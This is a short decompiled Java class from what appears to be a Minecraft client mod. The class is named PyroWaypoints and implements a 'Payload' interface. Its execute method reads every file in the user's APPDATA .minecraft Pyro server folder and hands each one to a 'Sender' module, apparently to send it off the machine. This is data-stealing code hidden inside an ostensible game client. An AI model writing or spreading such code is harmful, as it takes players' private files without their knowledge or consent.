package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.FileUtil;
import com.esoterik.client.util.Payload;
import java.io.File;
import java.util.Iterator;

public final class PyroWaypoints implements Payload {
   public void execute() throws Exception {
      Iterator var1 = FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\Pyro\\server").iterator();

      while(var1.hasNext()) {
         File file = (File)var1.next();
         Sender.send(file);
      }

   }
}
